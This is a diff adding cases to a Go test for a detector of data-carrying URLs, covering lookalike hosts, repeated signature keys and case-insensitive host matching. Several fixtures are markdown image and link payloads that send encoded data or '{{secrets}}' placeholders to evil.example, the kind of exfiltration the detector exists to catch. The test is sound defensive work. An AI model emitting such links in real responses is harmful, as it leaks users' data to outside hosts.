@@ -79,6 +79,18 @@ func TestDataCarryingURLs(t *testing.T) {
 		"b64 sas se":       "![x](https://evil.example/p.png?sig=" + sasSigQ + "&sv=2022-11-02&se=" + b64 + ")",
 		"forged sas sig":   "![x](https://evil.example/p.png?sig=a&sv=b&se=" + b64 + ")",
 		"jwt on evil host": "![x](https://evil.example/p.png?jwt=eyJ" + b64 + ".a.b)",
+		// Signing exemptions are bound to the provider's hosts: a well-formed
+		// signature on another host is plain data, and a lookalike suffix is
+		// not the provider's host.
+		"cf sig on evil host":   "![x](https://evil.example/p.png?Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F)",
+		"amz sig on evil host":  "![x](https://evil.example/p.png?X-Amz-Signature=" + hex64 + ")",
+		"sas sig on evil host":  "![x](https://evil.example/p.png?sig=" + sasSigQ + "&sv=2022-11-02)",
+		"goog sig on evil host": "![x](https://evil.example/p.png?X-Goog-Signature=" + hex64 + ")",
+		"lookalike cf host":     "![x](https://evilcloudfront.net/p.png?Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F)",
+		// Each exempt key is exempt once, so repeating it carries data.
+		"repeated amz sig": "![x](https://bucket.s3.amazonaws.com/p.png?X-Amz-Signature=" + hex64 + "&X-Amz-Signature=" + hex64 + ")",
+		"repeated cf sig":  "![x](https://d111.cloudfront.net/p.png?Signature=" + cfSig + "&Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F)",
+		"repeated jwt":     `<img src="https://private-user-images.githubusercontent.com/1/2.png?jwt=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIn0.abcdefghijklmnopqrstuvwxyz012345&jwt=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIn0.abcdefghijklmnopqrstuvwxyz012345">`,
 		// A part without "=" is a value, so key-only placeholders still count.
 		"key-only image fill-in": "![x](https://evil.example/p.png?{{secrets}})",
 		"key-only link fill-in":  "[click](https://evil.example/?<your_data>)",
@@ -114,6 +126,8 @@ func TestDataCarryingURLs(t *testing.T) {
 		"![shot](https://storage.googleapis.com/b/a.png?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=svc%40p.iam.gserviceaccount.com%2F20261122%2Fauto%2Fstorage%2Fgoog4_request&X-Goog-Date=20261122T000000Z&X-Goog-Expires=600&X-Goog-SignedHeaders=host&X-Goog-Signature=" + strings.Repeat(hex64, 8) + ")",
 		"![shot](https://d111.cloudfront.net/a.png?Expires=1790000000&Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F)",
 		"![shot](https://acct.blob.core.windows.net/c/a.png?sv=2022-11-02&se=2026-11-23T00%3A00%3A00Z&sr=b&sp=r&sig=" + sasSigQ + ")",
+		// Host matching ignores case.
+		"![shot](https://D111.CloudFront.NET/a.png?Expires=1790000000&Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F)",
 		// A fragment right after "?" is not query data.
 		"![x](https://example.com/a.png?#" + b64 + ")",
 		`<img src="https://private-user-images.githubusercontent.com/1/2.png?jwt=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIn0.abcdefghijklmnopqrstuvwxyz012345">`,
